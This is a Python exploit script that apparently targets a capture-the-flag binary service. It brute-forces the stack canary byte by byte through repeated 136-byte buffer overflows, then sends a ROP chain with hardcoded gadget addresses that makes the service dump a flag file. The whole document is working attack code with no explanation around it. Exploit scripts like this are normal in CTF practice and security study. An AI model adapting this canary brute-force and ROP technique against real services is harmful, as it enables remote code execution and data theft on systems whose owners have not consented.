#!/usr/bin/env python3

import socket
import struct
import time
import sys

s = socket.create_connection((sys.argv[1], int(sys.argv[2])))

def ru(suffix, debug=False):
  d = b""
  while 1:
    c = s.recv(4096)
    assert c
    d += c
    if debug:
      print(repr(d))
    if d.endswith(suffix):
      break
  return d

cookie_known = b""

while len(cookie_known) < 8:
  for i in range(256):
    ru(b"\nPlease enter your name: ")
    cookie = cookie_known + bytes([i])
    s.sendall(b"A" * 136 + cookie)
    d = ru(b"\n")
    if b"Do you want to play another round" in d:
      s.sendall(b"y\n")
      continue
    cookie_known = cookie
    print("cookie:", cookie_known)
    s.sendall(b"A" * 0x127)
    ru(b"Do you want to play another round? [y/n]\n")
    s.sendall(b"y\n")
    break

ru(b"\nPlease enter your name: ")
pop_rdi = 0x401e1b
flag_txt = 0x40215f
dump_file = 0x401308
rop = struct.pack("QQQQ", 0, pop_rdi, flag_txt, dump_file)
s.sendall(b"A" * 136 + cookie_known + rop)

ru(b"Do you want to play another round? [y/n]\n", True)
s.sendall(b"n\n")
